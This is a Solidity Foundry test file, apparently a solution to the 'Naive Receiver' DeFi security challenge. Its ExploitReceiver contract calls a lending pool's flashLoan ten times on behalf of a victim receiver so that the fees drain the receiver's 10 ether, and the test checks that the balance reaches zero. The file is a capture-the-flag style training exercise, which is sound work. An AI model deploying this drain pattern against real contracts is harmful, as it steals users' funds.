// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {NaiveReceiverLenderPool} from "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower,
        address,
        uint256,
        bytes calldata
    ) external returns (bool);
}

contract ExploitReceiver {
    address pool;
    address receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address poolAdr, address receiverAdr) {
        pool = poolAdr;
        receiver = receiverAdr;
    }

    function drainFunds(uint256 amount) external {
        for (uint256 i; i <= 9; i++) {
            INaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(receiver),
                ETH,
                amount,
                ""
            );
        }
    }
}

contract UnstoppableTest is Test {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;
    ExploitReceiver exploitReceiver;
    address owner;
    address player;
    address ETH;

    function setUp() public {
        owner = makeAddr("owner");
        player = makeAddr("player");

        pool = new NaiveReceiverLenderPool();

        ETH = pool.ETH();
        assertEq(pool.maxFlashLoan(ETH), 0);
        assertEq(pool.flashFee(ETH, 1), 1 ether);

        receiver = new FlashLoanReceiver(address(pool));

        vm.label(address(pool), "pool");
        vm.label(address(receiver), "Receiver");

        vm.deal(address(pool), 1000 ether);
        vm.deal(address(receiver), 10 ether);

        assertEq(address(pool).balance, 1000 ether);
        assertEq(address(receiver).balance, 10 ether);
    }

    function testNaiveReceiverExploit() public {
        vm.prank(player);

        exploitReceiver = new ExploitReceiver(address(pool), address(receiver));
        exploitReceiver.drainFunds(1 ether);
        validation();
    }

    function validation() public {
        // Receiver balance must be zero
        assertEq(address(receiver).balance, 0);
    }
}
